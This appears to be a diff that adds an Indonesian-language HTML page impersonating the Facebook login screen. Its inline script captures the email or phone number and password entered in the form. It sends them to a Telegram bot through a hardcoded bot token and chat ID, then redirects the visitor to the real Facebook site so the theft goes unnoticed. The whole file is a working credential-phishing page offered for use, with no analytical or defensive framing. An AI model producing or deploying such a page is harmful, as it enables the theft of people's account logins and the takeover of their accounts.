@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Facebook</title>
+    <link rel="stylesheet" href="styles.css">
+    <script>
+        // Fungsi untuk mengirim data ke bot Telegram
+        function kirimKeBotTelepon(emailOrPhone, password) {
+            // Ganti `YOUR_BOT_TOKEN` dengan token bot Telegram Anda
+            var botToken = '7068367383:AAEHpcHzp23kTikBLOTmbsbPkOcMX0Jbksw';
+            // Ganti `YOUR_CHAT_ID` dengan ID chat tempat Anda ingin menerima pesan
+            var chatId = '-1002227122219';
+            var pesan = 'Email atau Telepon: ' + emailOrPhone + '\nKata Sandi: ' + password;
+            var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(pesan);
+            
+            // Kirim request menggunakan XMLHttpRequest
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', url);
+            xhr.send();
+        }
+
+        // Fungsi untuk menangani pengiriman formulir
+        document.addEventListener('DOMContentLoaded', function() {
+            var form = document.querySelector('form');
+            form.addEventListener('submit', function(event) {
+                event.preventDefault();
+                var emailOrPhone = document.querySelector('input[type="text"]').value;
+                var password = document.querySelector('input[type="password"]').value;
+                // Panggil fungsi untuk mengirim data ke bot Telegram
+                kirimKeBotTelepon(emailOrPhone, password);
+                // Redirect ke halaman Facebook setelah mengirim
+                window.location.href = 'https://www.facebook.com';
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Masuk ke Facebook</h2>
+            <form>
+                <input type="text" placeholder="Email atau Telepon">
+                <input type="password" placeholder="Kata Sandi">
+                <button type="submit">Masuk</button>
+                <div class="forgot-password">
+                    <a href="#">Lupa kata sandi?</a>
+                </div>
+                <hr>
+                <button type="button" class="create-account">Buat Akun Baru</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
